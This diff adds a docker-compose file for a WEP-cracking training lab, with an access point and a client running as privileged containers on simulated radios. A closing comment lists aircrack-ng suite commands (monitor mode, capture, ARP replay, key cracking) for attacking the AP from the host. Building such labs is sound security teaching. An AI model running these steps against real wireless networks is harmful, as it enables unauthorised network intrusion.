@@ -1,0 +1,38 @@
+services:
+
+  # ─────────────────────────────────────────────
+  # Container A — WEP Access Point
+  # Uses wlan0 (created by mac80211_hwsim)
+  # Loads the kernel module for all containers
+  # ─────────────────────────────────────────────
+  ap:
+    build: ./ap
+    container_name: wep-ap
+    privileged: true          # Needs modprobe + raw netlink
+    network_mode: host        # Shares host netns — wlan* ifaces are on the host
+    volumes:
+      - /lib/modules:/lib/modules:ro  # So modprobe can find mac80211_hwsim
+    restart: on-failure
+
+  # ─────────────────────────────────────────────
+  # Container B — WEP Client
+  # Uses wlan1 (second radio from mac80211_hwsim)
+  # Must start AFTER ap so the module is already loaded
+  # ─────────────────────────────────────────────
+  client:
+    build: ./client
+    container_name: wep-client
+    privileged: true
+    network_mode: host        # Same netns — sees wlan1
+    volumes:
+      - /lib/modules:/lib/modules:ro
+    depends_on:
+      - ap
+    restart: on-failure
+
+# NOTE: wlan2 is available on the HOST (your Kali) for attacking.
+# The attacker is YOU — not a container.
+# Use: sudo airmon-ng start wlan2
+#      sudo airodump-ng wlan2mon -c 6 --bssid <AP_MAC>
+#      sudo aireplay-ng --arpreplay -b <AP_MAC> -h <CLIENT_MAC> wlan2mon
+#      sudo aircrack-ng -b <AP_MAC> capture.cap
